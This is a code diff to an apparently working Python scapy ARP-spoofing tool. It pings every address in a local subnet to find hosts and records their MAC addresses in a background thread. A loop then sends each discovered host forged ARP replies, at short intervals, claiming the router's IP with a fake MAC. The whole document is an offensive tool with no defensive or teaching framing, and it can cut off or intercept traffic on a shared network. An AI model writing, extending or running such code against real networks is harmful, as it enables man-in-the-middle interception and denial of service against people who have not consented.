@@ -1,4 +1,5 @@
 from scapy import all
+import threading
 import json
 import time
 import subprocess
@@ -9,9 +10,37 @@ target_ip = "192.168.31.219"
 target_mac = "e0:9d:31:de:a2:ba"
 src_mac    = 'ab:ab:ab:ab:ab:ab'
 
+
+class IPMap:
+
+    def __init__(self):
+        self.map = []
+        self.ips = []
+        self.ix = 0
+
+    def add_addr(self, ip, mac):
+        if ip in self.ips:
+            return False
+
+        self.map.append((ip, mac))
+        self.ips.append(ip)
+
+    def next(self):
+        if len(self.map) == 0:
+            return False, False
+
+        self.ix += 1
+
+        if self.ix >= len(self.map):
+            self.ix = 0
+
+        return self.map[self.ix]
+
 def ip_exists(ip):
     try:
-        subprocess.run(['ping', ip, '-W', '1', '-c', '1'], timeout=1)
+        print("Checking {}".format(ip))
+        subprocess.run(['ping', ip, '-W', '1', '-c', '1'], timeout=1,
+                       stdout=open('/tmp/null', 'w'))
         return True
     except:
         return False
@@ -43,39 +72,30 @@ def send_arp_poison(router_ip, target_ip, target_mac, src_mac="ab:ab:ab:ab:ab:ab
     packet = all.ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac, hwsrc=src_mac)
     all.send(packet)
 
-def build_ip2mac():
+def feed_ipmap():
     ip_addresses = get_all_possible_ip('192.168.31.29')
-    ip2mac = {}
     for ip in ip_addresses:
         if not ip_exists(ip):
-            print("{} doesn't exist".format(ip))
             continue
         mac = get_mac_addr(ip)
         if mac is not False:
-            ip2mac[ip] = mac
+            ip2mac.add_addr(ip, mac)
             print("{} recognized as {}".format(ip, mac))
 
-    json.dump(ip2mac, open('ip2mac.json', 'w'))
-
 def main():
-    ip2mac = json.load(open('ip2mac.json', 'r'))
-    ip2mac[target_ip] = target_mac
-    keys = itertools.cycle(ip2mac.keys())
 
     while True:
-        ip = next(keys)
+        ip, mac = ip2mac.next()
+        if not ip:
+            continue
         print("[*] Poisoning {}".format(ip))
-        mac = ip2mac[ip]
-        send_arp_poison(router_ip, target_ip=ip, target_mac=mac)
+        send_arp_poison(router_ip, target_ip=ip, target_mac=mac) 
         time.sleep(.3)
-build_ip2mac()
+
+ip2mac = IPMap()
+
+scanner_thread = threading.Thread(target=feed_ipmap)
+scanner_thread.start()
 main()
-
-
-
-
-
-
-
 
 
